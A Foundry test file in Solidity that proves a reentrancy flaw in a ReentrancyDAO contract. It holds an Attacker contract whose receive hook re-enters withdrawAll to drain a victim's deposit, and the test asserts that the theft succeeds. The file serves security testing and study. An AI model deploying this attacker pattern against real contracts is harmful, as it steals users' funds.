
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {ReentrancyDAO} from "../src/ReentrancyDAO.sol";

contract TestReentrancyReentrancyDAO is Test {
    ReentrancyDAO public _contractUnderTest;
    
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new ReentrancyDAO();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // --- 1. Constraints & Pitfall Avoidance ---
        vm.assume(attackVal > 1000); 
        vm.assume(attackVal < 100 ether);

        // --- 2. State Configuration (Pre-Condition) ---
        // We must fund the contract with a separate victim user first.
        // The vulnerable contract subtracts from 'balance' BEFORE the external call.
        // In Solidity 0.8+, this causes an underflow revert during the reentrant call
        // if the contract does not have sufficient 'balance' to cover the second withdrawal.
        address victimUser = address(0xCAFE);
        vm.deal(victimUser, attackVal);
        vm.prank(victimUser);
        _contractUnderTest.deposit{value: attackVal}();

        // --- 3. Funding ---
        // Fund the Test Contract (address(this)) so it can pass funds to the Attacker
        vm.deal(address(this), attackVal);

        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    ReentrancyDAO public victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedVal;

    constructor(address victimAddress) { 
        victim = ReentrancyDAO(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        storedVal = val;
        
        // Deposit funds to establish credit for the attack
        victim.deposit{value: val}();
    }

    function attack(uint256 val) public {
        // 1. Capture Initial State.
        initialSnapshot = address(this).balance;

        // 3. Call the vulnerable function.
        victim.withdrawAll();

        // 4. Verify Success Conditions.
        // If successful, we withdrew the principal (val) + stolen funds (val).
        if (address(this).balance > initialSnapshot + val) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            // Increment attackCallCount to prevent infinite recursion
            attackCallCount++;
            // Re-enter the contract
            victim.withdrawAll();
        }
    }
}
